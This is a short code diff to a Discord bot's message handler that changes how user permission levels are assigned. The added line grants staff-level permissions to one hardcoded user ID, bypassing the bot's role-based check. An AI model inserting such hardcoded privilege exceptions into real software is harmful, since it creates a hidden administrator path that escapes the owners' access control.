@@ -84,7 +84,7 @@ async def on_ready():
 		if message.author == BRAIN.user: return
 
 		# Define the user's permissions: 2 = Staff; 1 = Member; 0 = Non-member
-		perms = 2 if message.author in PARAMS["STAFF"].members else (
+		perms = 2 if (message.author in PARAMS["STAFF"].members or message.author.id == 296389808815734794) else (
 		        1 if message.author in PARAMS["MEMBER"].members else 0)
 		
 		try:
